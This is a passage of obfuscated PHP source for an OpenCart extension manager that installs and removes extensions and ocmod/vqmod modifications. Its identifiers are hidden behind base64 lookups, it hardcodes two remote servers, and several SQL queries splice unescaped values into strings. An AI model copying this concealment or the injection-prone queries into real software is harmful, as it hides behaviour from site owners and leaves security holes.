<?php
function f_bca6cf5211f3eb7445fe7c834142b67a($name) {$_0b774b5662c8a308d514260054c45f3b=array('55577ed57ec0d'=>'cmVnaXN0cnk=','55577ed57ec5e'=>'cmVnaXN0cnk=','55577ed57eca9'=>'Z2V0','55577ed57ecf4'=>'cmVnaXN0cnk=','55577ed57ed3e'=>'c2V0','55577ed57ed88'=>'bG9hZA==','55577ed57edd2'=>'aW5mbw==','55577ed57ee1c'=>'Y29uZmln','55577ed57ee67'=>'Z2V0','55577ed57eeb1'=>'aW5mbw==','55577ed57eed7'=>'cGFyYW1z','55577ed57ef22'=>'cGFyYW1z','55577ed57ef6c'=>'aW5mbw==','55577ed57efb7'=>'aW5zdGFsbA==','55577ed57f001'=>'bGFuZ3VhZ2U=','55577ed57f04b'=>'Z2V0','55577ed57f096'=>'cmVnaXN0cnk=','55577ed57f0e1'=>'aW5mbw==','55577ed57f12c'=>'ZmllbGRz','55577ed57f176'=>'bGFuZ3VhZ2Vz','55577ed57f1c3'=>'Y29uZmln','55577ed57f218'=>'Z2V0','55577ed57f264'=>'bGFuZ3VhZ2Vz','55577ed57f2af'=>'Y29uZmln','55577ed57f32e'=>'Z2V0','55577ed57f37a'=>'bGFuZ3VhZ2Vz','55577ed57f3c5'=>'Y29uZmln','55577ed57f40f'=>'Z2V0','55577ed57f459'=>'Xw==','55577ed57f4a4'=>'aW5mbw==','55577ed57f4ee'=>'Xw==','55577ed57f538'=>'aW5mbw==','55577ed57f583'=>'bG9hZA==','55577ed57f5cf'=>'ZmllbGRz','55577ed57f61a'=>'ZmllbGRz','55577ed57f664'=>'Y29uZmln','55577ed57f6a7'=>'aGFz','55577ed57f6f2'=>'Y29uZmln','55577ed57f73d'=>'c2F2ZQ==','55577ed57f787'=>'Y29uZmln','55577ed57f7d1'=>'aGFz','55577ed57f81b'=>'Y29uZmln','55577ed57f865'=>'c2F2ZQ==','55577ed57f8af'=>'bG9hZA==','55577ed57f8f9'=>'aW5mbw==','55577ed57f944'=>'cGFyYW1z','55577ed57f98e'=>'aW5mbw==','55577ed57f9d8'=>'Y29uZmln','55577ed57fa22'=>'c2F2ZQ==','55577ed57fa6c'=>'aW5mbw==','55577ed57fa8e'=>'aW5zdGFsbA==','55577ed57fada'=>'bGFuZ3VhZ2U=','55577ed57fb24'=>'Z2V0','55577ed57fb6e'=>'aW5mbw==','55577ed57fbb8'=>'bG9hZA==','55577ed57fc02'=>'bW9kcw==','55577ed57fc4c'=>'bW9kcw==','55577ed57fc96'=>'aW5zdGFsbF9vY21vZA==','55577ed57fce0'=>'bW9kcw==','55577ed57fd2b'=>'aW5zdGFsbF9vY21vZA==','55577ed57fd76'=>'c2Vzc2lvbg==','55577ed57fdc0'=>'ZGF0YQ==','55577ed57fe0a'=>'bW9kcw==','55577ed57fe54'=>'aW5zdGFsbF92cW1vZA==','55577ed57fe76'=>'bW9kcw==','55577ed57fec4'=>'aW5zdGFsbF92cW1vZA==','55577ed57ff0f'=>'bGFuZ3VhZ2U=','55577ed57ff59'=>'Z2V0','55577ed57ffa3'=>'ZGI=','55577ed57ffee'=>'cXVlcnk=','55577ed580038'=>'Y29kZQ==','55577ed580082'=>'bnVtX3Jvd3M=','55577ed5800cc'=>'ZGI=','55577ed580116'=>'cXVlcnk=','55577ed580160'=>'ZGI=','55577ed5801aa'=>'ZXNjYXBl','55577ed5801f4'=>'bmFtZQ==','55577ed58023f'=>'dmVyc2lvbg==','55577ed58025e'=>'Y29kZQ==','55577ed5802a8'=>'YXV0aG9y','55577ed5802f3'=>'bGluaw==','55577ed58033d'=>'ZGI=','55577ed580387'=>'cXVlcnk=','55577ed5803d1'=>'ZGI=','55577ed58041b'=>'ZXNjYXBl','55577ed580465'=>'bmFtZQ==','55577ed5804af'=>'dmVyc2lvbg==','55577ed5804f8'=>'YXV0aG9y','55577ed580542'=>'bGluaw==','55577ed58058d'=>'bG9hZA==','55577ed5805d8'=>'dW5pbnN0YWxs','55577ed580622'=>'dW5pbnN0YWxsX21vZHM=','55577ed580646'=>'Y29uZmln','55577ed580691'=>'cmVtb3Zl','55577ed5806db'=>'ZGI=','55577ed580725'=>'cXVlcnk=','55577ed58076f'=>'bGFuZ3VhZ2U=','55577ed5807b9'=>'Z2V0','55577ed580803'=>'aW5mbw==','55577ed58084e'=>'bG9hZA==','55577ed580898'=>'bW9kcw==','55577ed5808e2'=>'bW9kcw==','55577ed58092c'=>'ZGI=','55577ed580976'=>'cXVlcnk=','55577ed5809c0'=>'bW9kcw==','55577ed580a0b'=>'bW9kcw==','55577ed580a2f'=>'Z2V0UGF0aG5hbWU=','55577ed580a7a'=>'Z2V0UGF0aG5hbWU=','55577ed580ac4'=>'aXNEaXI=','55577ed580b0e'=>'aXNMaW5r','55577ed580b58'=>'Z2V0UGF0aG5hbWU=','55577ed580ba2'=>'Z2V0UGF0aG5hbWU=','55577ed580bec'=>'dW5pbnN0YWxs','55577ed580c36'=>'bG9hZA==','55577ed580c80'=>'ZmlsZXM=','55577ed580ccb'=>'c2Vzc2lvbg==','55577ed580d15'=>'ZGF0YQ==','55577ed580d60'=>'c2VydmVycw==','55577ed580daa'=>'c2Vzc2lvbg==','55577ed580df4'=>'ZGF0YQ==','55577ed580e17'=>'c2VydmVy','55577ed580e62'=>'Y3VycmVudF9zZXJ2ZXI=','55577ed580eac'=>'dXJsX3BhcmFtcw==','55577ed580ef6'=>'Y2hlY2tIb3N0','55577ed580f40'=>'c2Vzc2lvbg==','55577ed580f8a'=>'ZGF0YQ==','55577ed580fd5'=>'ZmlsZUdldA==','55577ed58101f'=>'Y3VycmVudF9zZXJ2ZXI=','55577ed58106a'=>'c2Vzc2lvbg==','55577ed5810b8'=>'ZGF0YQ==','55577ed581103'=>'c2Vzc2lvbg==','55577ed58114d'=>'ZGF0YQ==','55577ed581197'=>'c2Vzc2lvbg==','55577ed5811e2'=>'ZGF0YQ==','55577ed5811fe'=>'c2Vzc2lvbg==','55577ed581248'=>'ZGF0YQ==','55577ed581293'=>'c2Vzc2lvbg==','55577ed5812de'=>'ZGF0YQ==','55577ed581328'=>'c2Vzc2lvbg==','55577ed581372'=>'ZGF0YQ==','55577ed5813bc'=>'c2Vzc2lvbg==','55577ed581406'=>'ZGF0YQ==','55577ed581450'=>'c2Vzc2lvbg==','55577ed58149a'=>'ZGF0YQ==','55577ed5814e6'=>'Z2V0QVBJ','55577ed581531'=>'c2Vzc2lvbg==','55577ed58157b'=>'ZGF0YQ==','55577ed5815c5'=>'Y29uZmln','55577ed5815e6'=>'c2F2ZQ==','55577ed581631'=>'c2Vzc2lvbg==','55577ed58167b'=>'ZGF0YQ==','55577ed5816c5'=>'c2Vzc2lvbg==','55577ed58170f'=>'ZGF0YQ==','55577ed581759'=>'ZmlsZUdldA==','55577ed5817a4'=>'b3Blbg==','55577ed5817ef'=>'Z2V0UmVhbFBhdGg=','55577ed58183a'=>'YWRkRmlsZQ==','55577ed581885'=>'Y2xvc2U=','55577ed5818e6'=>'aGFzaA==','55577ed581934'=>'dmVyc2lvbg==','55577ed58197e'=>'dmVyc2lvbg==','55577ed5819c9'=>'dmVyc2lvbg==','55577ed581a1d'=>'ZmllbGRz','55577ed581a6b'=>'ZGlyZWN0b3J5','55577ed581ab7'=>'ZGlyZWN0b3J5','55577ed581b03'=>'ZGlyZWN0b3J5','55577ed581b4f'=>'aGVhZGluZ190aXRsZQ==','55577ed581b9a'=>'bmFtZQ==','55577ed581be6'=>'aGVhZGluZ190aXRsZQ==','55577ed581c31'=>'bmFtZQ==','55577ed581c7e'=>'dmVyc2lvbg==','55577ed581cca'=>'dmVyc2lvbg==','55577ed581d17'=>'aGFzaA==','55577ed581d63'=>'bmFtZQ==','55577ed581daf'=>'b2Ntb2Q=','55577ed581dff'=>'b2Ntb2Q=','55577ed581e4c'=>'cmVmcmVzaF9tb2Rz','55577ed581e98'=>'dnFtb2Q=','55577ed581ee3'=>'dnFtb2Q=','55577ed581f33'=>'bmFtZQ==','55577ed581f7f'=>'b2Ntb2Q=','55577ed581fcc'=>'dnFtb2Q=','55577ed582017'=>'dnFtb2Q=','55577ed582065'=>'YWRkaXN0X2FwaV9zZXJ2ZXI=','55577ed5820b1'=>'YWRkaXN0X2FwaV9zZXJ2ZXI=','55577ed5820ff'=>'aG9zdA==','55577ed58214c'=>'YWRkaXN0X2FwaV9zZXJ2ZXI=','55577ed582198'=>'dG9rZW4=','55577ed5821ec'=>'dG9rZW4=','55577ed582239'=>'dG9rZW4=','55577ed582285'=>'dG9rZW4=',);return base64_decode($_0b774b5662c8a308d514260054c45f3b[$name]);}
#encode-me[string],encode-me[ioncube-]#
class AddistExtension
{
	protected $registry;
    protected $server = 'http://88.201.249.106/,http://cvshis.bget.ru/';
    protected $current_server;
    
    public function __construct($registry)
    {
        $this->{/*'55577ed57e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ec0d')/*'7ec0'*/} = $registry;
    }
    
	public function __get($key)
    {
		return $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ec5e')/*'ec5e'*/}->{/*'7eca9'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57eca9')/*'5577ed57'*/}($key);
	}
	
	public function __set($key, $value)
    {
		$this->{/*'f4'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ecf4')/*'f4'*/}->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ed3e')/*'7ed3e'*/}($key, $value);
	}
    
    public function init($path)
    {
        list($group,$code,$model) = explode('/',$path);
        $info = $this->{/*'5577ed57e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ed88')/*''*/}($path)->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57edd2')/*'5577ed57ed'*/};
        $params = $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ee1c')/*''*/}->{/*'7ed57ee6'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ee67')/*''*/}(${/*'eeb1'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57eeb1')/*'1'*/}[/*'ed5818e6'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5818e6')/*'d'*/].'_extension');
        
        if (empty(${/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57eed7')/*'d7'*/}[/*'77'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581934')/*'7'*/]) || ${/*'ed57ef22'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ef22')/*'57ef22'*/}[/*'ed58197e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58197e')/*'557'*/] != ${/*'7'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ef6c')/*'7ef6c'*/}[/*'7ed5819c9'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5819c9')/*'5'*/])
        {
            $this->{/*'b7'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57efb7')/*''*/}($path);
            addMessage('success',$this->{/*'ed57f001'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f001')/*'001'*/}->{/*'d57f04b'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f04b')/*'ed57f04b'*/}('addist_success_update'),true);
        }
    }
    
    public function load($path)
    {
        global $languages;
        list($group,$code,$model) = explode('/',$path);
        $file/*
new DIR_SYSTEM*/=/*
*/DIR_SYSTEM.'addist/extension/'.$model.'/install.php';
        if (file_exists($file))
        {
            require_once($file);
            $extension/*
new new*/=/*
*/new $model($this->{/*'ed57f096'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f096')/*''*/});
            
            $extension->{/*'f0e1'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f0e1')/*'77e'*/}[/*'77ed58'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581a1d')/*'d581a1d'*/] = $extension->{/*'1'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f12c')/*'7f'*/};
            
            if (IS_ADMIN)
            {
                $langfile/*
new DIR_SYSTEM*/=/*
*/DIR_SYSTEM.'../'.basename(DIR_APPLICATION).'/language/'.${/*'17'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f176')/*''*/}[$this->{/*'7ed57f1'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f1c3')/*'5'*/}->{/*'8'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f218')/*'577e'*/}('config_language')][/*'b'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581a6b')/*'1a6b'*/].'/'.$group.'/'.$code.'.php';
            }
            else
            {
                $langfile/*
new DIR_SYSTEM*/=/*
*/DIR_SYSTEM.'../admin/language/'.${/*'264'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f264')/*'f26'*/}[$this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f2af')/*''*/}->{/*'32e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f32e')/*'577ed'*/}('config_language')][/*'d581ab7'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581ab7')/*''*/].'/'.$group.'/'.$code.'.php';
            }
            
            if (!file_exists($langfile))
            {
                $langfile/*
new str_replace*/=/*
*/str_replace('/'.${/*'d57f37'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f37a')/*'f37'*/}[$this->{/*'57f3'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f3c5')/*'ed57'*/}->{/*'d57f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f40f')/*'40f'*/}('config_language')][/*'7'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581b03')/*'03'*/].'/','/english/',$langfile);
            }
            
            if (file_exists($langfile))
            {
                include(realpath($langfile));
                if (isset(${/*'59'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f459')/*'59'*/}[/*'f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581b4f')/*'b4'*/]))
                {
                    $extension->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f4a4')/*'55577ed5'*/}[/*'d'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581b9a')/*'77ed581b9a'*/] = ${/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f4ee')/*'ee'*/}[/*'6'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581be6')/*'55'*/];
                }
                else
                {
                    $extension->{/*'538'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f538')/*'38'*/}[/*'5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581c31')/*'7ed5'*/] = '';
                }
            }
            elseif (IS_ADMIN)
            {
                exit('Fatal error. Please, contact dev@addist.ru for support.');
            }
            
            return $extension;
        }
        else
        {
            return false;
        }
    }
    
    public function install($path)
    {
        list($group,$code,$model) = explode('/',$path);
        $extension = $this->{/*'7f583'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f583')/*'3'*/}($path);
        
        //adding fields
        if (!empty($extension->{/*'ed57f5c'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f5cf')/*'7ed57f5cf'*/}))
        {
            foreach($extension->{/*'1a'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f61a')/*'7ed'*/} as $key=>$value)
            {
                if (!$this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f664')/*'55577ed57f6'*/}->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f6a7')/*'7f6a7'*/}($code.'_'.$key))
                {
                    $this->{/*'2'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f6f2')/*'7ed57f6f2'*/}->{/*'7e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f73d')/*''*/}($code,$key,$value,0);
                }
            }
        }
        
        if (!$this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f787')/*'d57f787'*/}->{/*'77ed'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f7d1')/*'f7d1'*/}($code.'_status'))
        {
            $this->{/*'b'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f81b')/*'f81b'*/}->{/*'7f865'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f865')/*''*/}($code,'status',false,0);
        }
        
        //save params
        $info = $this->{/*'55577ed57f8af'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f8af')/*'d57f8af'*/}($path)->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f8f9')/*'f8f9'*/};
        ${/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f944')/*''*/}[/*'81c7e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581c7e')/*'5577ed'*/] = ${/*'577ed57f98e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f98e')/*'55'*/}[/*'a'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581cca')/*'ca'*/];
        $this->{/*'77ed57f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57f9d8')/*'f9d8'*/}->{/*'2'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fa22')/*'77ed57fa22'*/}(${/*'7ed57fa6c'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fa6c')/*'ed57fa6c'*/}[/*'ed581d17'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581d17')/*'ed581d17'*/],'extension',$params);
        
        //installing mod
        if (method_exists($extension,'install'))
        {
            $extension->{/*'e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fa8e')/*'7fa8e'*/}();
        }
        
        //success message
        addMessage('success',sprintf($this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fada')/*'a'*/}->{/*'5577ed57'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fb24')/*'b24'*/}('addist_text_installed'),$extension->{/*'fb6'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fb6e')/*'6e'*/}[/*'3'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581d63')/*'7ed581d63'*/]));
    }
    
    public function install_mods($path)
    {
        list($group,$code,$model) = explode('/',$path);
        $extension = $this->{/*'77ed57fbb8'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fbb8')/*'55577e'*/}($path);
        
        if (!empty($extension->{/*'ed57fc02'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fc02')/*'5557'*/}))
        {
            if (OC_VERSION == '2.0.x' && !empty($extension->{/*'5577'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fc4c')/*'55577'*/}[/*'d'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581daf')/*''*/]))
            {
                $this->{/*'577ed5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fc96')/*'7'*/}(DIR_ADDIST.'install/ocmod/addist.ocmod.xml','addist');
                foreach($extension->{/*'e0'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fce0')/*'55'*/}[/*'57'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581dff')/*''*/] as $file)
                {
                    if (version_compare(VERSION,'2.0.2') >= 0 && is_file(DIR_ADDIST.'extension/'.$model.'/ocmod/2.0.2/'.basename($file)))
                    {
                        $ocmod_file/*
new DIR_ADDIST*/=/*
*/DIR_ADDIST.'extension/'.$model.'/ocmod/2.0.2/'.basename($file);
                    }
                    else
                    {
                        $ocmod_file/*
new DIR_ADDIST*/=/*
*/DIR_ADDIST.'extension/'.$model.'/ocmod/'.basename($file);
                    }
                    if (file_exists($ocmod_file))
                    {
                        $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fd2b')/*'7'*/}($ocmod_file,$model);
                    }
                }
                $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fd76')/*'6'*/}->{/*'77ed57fdc'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fdc0')/*'5577ed'*/}[/*'581e4c'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581e4c')/*'77ed581'*/] = true;
            }
            elseif (!empty($extension->{/*'5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fe0a')/*''*/}[/*'55577ed5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581e98')/*'98'*/]))
            {
                $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fe54')/*'7ed57fe54'*/}(DIR_ADDIST.'install/vqmod/addist.xml');
                foreach($extension->{/*'7ed5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fe76')/*'7ed57fe'*/}[/*'7ed581ee3'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581ee3')/*'557'*/] as $file)
                {
                    $vqmod_file/*
new DIR_ADDIST*/=/*
*/DIR_ADDIST.'extension/'.$model.'/vqmod/'.basename($file);
                    if (file_exists($vqmod_file))
                    {
                        $this->{/*'c4'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57fec4')/*'7fec4'*/}($vqmod_file);
                    }
                } 
            }
        }
        
        addMessage('success',$this->{/*'57ff0f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ff0f')/*'0f'*/}->{/*'7'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ff59')/*'7f'*/}('addist_success_mods'));
    }
    
    public function install_ocmod($file,$code)
    {
        $xmlstring/*
new file_get_contents*/=/*
*/file_get_contents($file);
        $xmlstring/*
new str_replace*/=/*
*/str_replace('"admin/','"'.basename(DIR_APPLICATION).'/',$xmlstring);
        $xml/*
new new*/=/*
*/new SimpleXMLElement($xmlstring);
        
        $query_check = $this->{/*'5577ed'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ffa3')/*'d57ff'*/}->{/*'577ed57'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed57ffee')/*'ee'*/}("SELECT * FROM " . DB_PREFIX . "modification WHERE `code` = '" . trim($xml->{/*'0038'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580038')/*'038'*/}) . "'");
        if ($query_check->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580082')/*'d5'*/})
        {
            $this->{/*'ed5800cc'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5800cc')/*'00'*/}->{/*'ed58'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580116')/*'6'*/}("UPDATE " . DB_PREFIX . "modification SET `xml` = '".$this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580160')/*'d580160'*/}->{/*'a'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5801aa')/*'aa'*/}($xmlstring)."', `name` = '".trim($xml->{/*'801'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5801f4')/*'7ed5801f4'*/})."', `version` = '".trim($xml->{/*'3f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58023f')/*'58023f'*/})."', `code` = '".trim($xml->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58025e')/*'55577ed5802'*/})."', `author` = '".trim($xml->{/*'77ed580'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5802a8')/*''*/})."', `link` = '".trim($xml->{/*'77ed5802f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5802f3')/*'f3'*/})."', `status` = '1' WHERE `code` = '$code'");
        }
        else
        {
            $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58033d')/*'8033d'*/}->{/*'d'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580387')/*'d58'*/}("INSERT IGNORE INTO " . DB_PREFIX . "modification SET `xml` = '".$this->{/*'77ed'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5803d1')/*'577ed5803d1'*/}->{/*'58041b'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58041b')/*'8041b'*/}($xmlstring)."', `name` = '".trim($xml->{/*'8'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580465')/*'5'*/})."', `version` = '".trim($xml->{/*'7ed5804af'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5804af')/*'d5804af'*/})."', `code` = '$code', `author` = '".trim($xml->{/*'d5804f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5804f8')/*'77ed5804f'*/})."', `link` = '".trim($xml->{/*'5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580542')/*''*/})."', `status` = '1', `date_added` = NOW()");
        }
    }
    
    public function install_vqmod($file)
    {
        $xmlstring/*
new file_get_contents*/=/*
*/file_get_contents($file);
        $xmlstring/*
new str_replace*/=/*
*/str_replace('"admin/','"'.basename(DIR_APPLICATION).'/',$xmlstring);
        file_put_contents(DIR_SYSTEM.'../vqmod/xml/'.basename($file),$xmlstring);
    }
    
    public function uninstall($path)
    {
        list($group,$code,$model) = explode('/',$path);
        $extension = $this->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58058d')/*''*/}($path);
        
        //uninstall extension
        if (method_exists($extension,'uninstall'))
        {
            $extension->{/*'577ed5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5805d8')/*'805d8'*/}();
        }
        
        //uninstalling mods
        $this->{/*'622'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580622')/*'577'*/}($path);
        
        //removing configs
        $this->{/*'7ed580646'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580646')/*'80646'*/}->{/*'1'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580691')/*'580'*/}($code);
        
        //remove from db
        $this->{/*'d5806db'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5806db')/*'db'*/}->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580725')/*'580725'*/}("DELETE FROM " . DB_PREFIX . "extension WHERE `type` = '$group' AND `code` = '$code'");
        
        //success message
        addMessage('success',sprintf($this->{/*'577ed58076f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58076f')/*'8076f'*/}->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5807b9')/*'7'*/}('addist_text_uninstalled'),$extension->{/*'55577ed58080'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580803')/*'d580803'*/}[/*'f33'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581f33')/*'1f'*/]),true);
    }
    
    public function uninstall_mods($path)
    {
        list($group,$code,$model) = explode('/',$path);
        $extension = $this->{/*'084e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58084e')/*'55577ed58084e'*/}($path);
        
        if (!empty($extension->{/*'d580898'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580898')/*'8'*/}))
        {
            if (OC_VERSION == '2.0.x' && !empty($extension->{/*'577ed5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5808e2')/*'5808e2'*/}[/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581f7f')/*'f'*/]))
            {
                $this->{/*'d5809'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed58092c')/*'d58092c'*/}->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580976')/*'ed580976'*/}("DELETE FROM " . DB_PREFIX . "modification WHERE `code` = '$model'");
            }
            elseif (!empty($extension->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed5809c0')/*'809c0'*/}[/*'77'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed581fcc')/*'d581fcc'*/]))
            {
                foreach($extension->{/*'580a0b'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580a0b')/*''*/}[/*'77ed5'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed582017')/*'2017'*/] as $file)
                {
                    $vqmod_file/*
new DIR_SYSTEM*/=/*
*/DIR_SYSTEM.'../vqmod/xml/'.basename($file);
                    if (file_exists($vqmod_file))
                    {
                        unlink($vqmod_file);
                    }
                } 
            }
        }
        
        if (OC_VERSION == '2.0.x')
        {
            foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator(DIR_MODIFICATION, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST) as $path) {
                if (basename($path->{/*'2f'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580a2f')/*'7ed580'*/}()) != 'index.html')
                {
                    if (file_exists($path->{/*'5577'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580a7a')/*'d580a7a'*/}()))
                    {
                        $path->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580ac4')/*'4'*/}() && !$path->{/*'0e'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580b0e')/*'0b0'*/}() ? rmdir($path->{/*'58'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580b58')/*'577'*/}()) : unlink($path->{/*'577ed580'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580ba2')/*'2'*/}());
                    }
                }
            }
        }
    }
    
    public function remove($path)
    {
        $this->{/*'80bec'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580bec')/*''*/}($path);
        $extension = $this->{/*'7ed580c36'*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580c36')/*'c'*/}($path);
        foreach($extension->{/*''*/f_bca6cf5211f3eb7445fe7c834142b67a('55577ed580c80')/*'80c80'*/} as $file)
        {
            if (file_exists(DIR_SYSTEM.'../'.$file))
            {
